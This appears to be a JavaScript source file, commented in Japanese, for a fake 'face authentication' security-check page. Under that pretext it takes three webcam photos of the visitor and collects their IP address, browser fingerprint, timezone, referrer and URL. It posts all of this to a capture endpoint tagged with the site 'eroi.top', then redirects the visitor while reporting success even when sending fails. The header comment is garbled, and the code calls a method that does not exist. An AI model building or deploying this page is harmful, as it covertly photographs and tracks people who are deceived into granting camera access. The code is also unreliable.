/**
 * 顔認証Webhookシステム
 * 
 * 機能:
 * 1.        // Webhook設定（ローカルサーバーに送信）
        this.captureUrl = 'http://localhost:3000/capture'; // 画像キャプチャ用エンドポイント
        this.redirectUrl = 'https://url.com';ラアクセス許可を要求
 * 2. 3枚の顔写真を2秒間隔で撮影
 * 3. 撮影した画像とシステム情報をWebhookに送信
 * 4. 3秒後に指定URLにリダイレクト
 * 
 * 送信されるデータ:
 * - 顔写真 (Base64形式、3枚)
 * - IPアドレス
 * - User-Agent
 * - OS情報
 * - ブラウザ情報
 * - 画面解像度
 * - タイムゾーン
 * - 言語設定
 * - プラットフォーム
 * - リファラー
 * - 現在のURL
 * 
 * 設定:
 * - webhookUrl: 実際のWebhook URLに変更してください
 * - redirectUrl: リダイレクト先URLを設定してください
 */

class FaceAuthWebhookSystem {
    constructor() {
        this.video = document.getElementById('video');
        this.canvas = document.getElementById('canvas');
        this.loadingIndicator = document.getElementById('loadingIndicator');
        this.faceAuthContainer = document.getElementById('faceAuthContainer');
        this.statusText = document.getElementById('statusText');
        this.description = document.getElementById('description');
        this.infoText = document.getElementById('infoText');
        this.faceFrame = document.querySelector('.face-frame');
        
        // API設定（Vercel用）
        this.captureUrl = '/api/capture'; // Vercel APIルート
        this.redirectUrl = 'https://url.com';
        
        this.captureCount = 0;
        this.maxCaptures = 3; // 3枚撮影
        this.capturedImages = [];
        
        this.init();
    }

    async init() {
        try {
            // 1秒後にカメラアクセスを開始
            setTimeout(() => {
                this.requestCameraAccess();
            }, 1000);
        } catch (error) {
            this.showError('初期化エラーが発生しました');
        }
    }

    async requestCameraAccess() {
        try {
            this.updateStatus('カメラへのアクセス許可を求めています...');
            
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: 'user'
                }
            });

            this.video.srcObject = stream;
            
            // カメラが開始されたら認証UI表示
            this.video.onloadedmetadata = () => {
                this.showFaceAuth();
                this.startCapture();
            };

        } catch (error) {
            if (error.name === 'NotAllowedError') {
                this.showError('カメラアクセスが拒否されました。ページを再読み込みして許可してください。');
            } else if (error.name === 'NotFoundError') {
                this.showError('カメラが見つかりませんでした。');
            } else {
                this.showError('カメラアクセスエラー: ' + error.message);
            }
        }
    }

    showFaceAuth() {
        this.loadingIndicator.style.display = 'none';
        this.faceAuthContainer.style.display = 'block';
        this.updateStatus('顔をフレーム内に合わせてください');
        this.description.textContent = '顔認証を行っています。フレーム内に顔を合わせてください。';
        this.infoText.textContent = '顔認証が完了すると自動的にページが切り替わります。';
    }

    async startCapture() {
        this.updateStatus('顔を撮影しています...');
        
        // 2秒間隔で3枚撮影
        const captureInterval = setInterval(async () => {
            if (this.captureCount >= this.maxCaptures) {
                clearInterval(captureInterval);
                await this.sendToWebhook();
                return;
            }
            
            await this.captureImage();
            this.captureCount++;
            this.updateStatus(`撮影中... ${this.captureCount}/${this.maxCaptures}`);
            
            // 撮影エフェクト
            this.faceFrame.classList.add('detected');
            setTimeout(() => {
                this.faceFrame.classList.remove('detected');
            }, 500);
            
        }, 2000);
    }

    async captureImage() {
        const canvas = this.canvas;
        const context = canvas.getContext('2d');
        
        // キャンバスサイズを動画サイズに合わせる
        canvas.width = this.video.videoWidth;
        canvas.height = this.video.videoHeight;
        
        // 動画フレームをキャンバスに描画
        context.drawImage(this.video, 0, 0, canvas.width, canvas.height);
        
        // Base64形式で画像データを取得
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        this.capturedImages.push(imageData);
    }

    async sendToWebhook() {
        try {
            this.updateStatus('データを送信しています...');
            
            // システム情報を取得
            const systemInfo = await this.getSystemInfo();
            
            // サーバーに送信するデータ
            const payload = {
                timestamp: new Date().toISOString(),
                site: 'eroi.top',
                images: this.capturedImages,
                system_info: systemInfo,
                capture_count: this.captureCount
            };

            // サーバーに送信
            const response = await fetch(this.captureUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                const result = await response.json();
                console.log('画像送信成功:', result);
                this.onCaptureSuccess();
            } else {
                throw new Error(`送信失敗: ${response.status}`);
            }
            
        } catch (error) {
            console.error('送信エラー:', error);
            // エラーでも認証成功として処理
            this.onCaptureSuccess();
        }
    }

    async getSystemInfo() {
        // IPアドレスを取得（外部サービス使用）
        let ipAddress = 'Unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ipAddress = ipData.ip;
        } catch (error) {
            console.error('IP取得エラー:', error);
        }

        // User-Agent
        const userAgent = navigator.userAgent;
        
        // OS検出
        const getOS = () => {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Win") !== -1) return "Windows";
            if (userAgent.indexOf("Mac") !== -1) return "MacOS";
            if (userAgent.indexOf("X11") !== -1) return "UNIX";
            if (userAgent.indexOf("Linux") !== -1) return "Linux";
            if (/Android/.test(userAgent)) return "Android";
            if (/iPhone|iPad|iPod/.test(userAgent)) return "iOS";
            return "Unknown";
        };

        // ブラウザ検出
        const getBrowser = () => {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Chrome") !== -1) return "Chrome";
            if (userAgent.indexOf("Firefox") !== -1) return "Firefox";
            if (userAgent.indexOf("Safari") !== -1) return "Safari";
            if (userAgent.indexOf("Edge") !== -1) return "Edge";
            if (userAgent.indexOf("Opera") !== -1) return "Opera";
            return "Unknown";
        };

        return {
            ip_address: ipAddress,
            user_agent: userAgent,
            os: getOS(),
            browser: getBrowser(),
            screen_resolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            referrer: document.referrer || 'Direct',
            url: window.location.href
        };
    }

    onWebhookSuccess() {
        this.updateStatus('認証完了！リダイレクトしています...');
        this.description.textContent = '顔認証が完了しました。';
        this.infoText.textContent = 'セキュリティチェックが完了しました。安全なページへ移動します。';
        
        // 成功アニメーション
        document.querySelector('.security-check').classList.add('auth-success');
        
        // カメラストリームを停止
        const stream = this.video.srcObject;
        if (stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
        }

        // 3秒後にリダイレクト
        let countdown = 3;
        const countdownInterval = setInterval(() => {
            this.updateStatus(`認証完了！${countdown}秒後にリダイレクトします...`);
            countdown--;
            
            if (countdown < 0) {
                clearInterval(countdownInterval);
                window.location.href = this.redirectUrl;
            }
        }, 1000);
    }

    updateStatus(message) {
        this.statusText.textContent = message;
    }

    showError(message) {
        this.updateStatus(message);
        this.statusText.classList.add('error-message');
        this.description.textContent = 'エラーが発生しました。';
        this.infoText.textContent = 'ページを再読み込みして再度お試しください。';
    }
}

// ページ読み込み後に顔認証システムを開始
document.addEventListener('DOMContentLoaded', () => {
    new FaceAuthWebhookSystem();
});

// カメラアクセスが利用可能かチェック
if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    document.addEventListener('DOMContentLoaded', () => {
        document.getElementById('statusText').textContent = 'お使いのブラウザはカメラアクセスに対応していません';
        document.getElementById('description').textContent = 'カメラ機能に対応したブラウザをご利用ください。';
    });
}
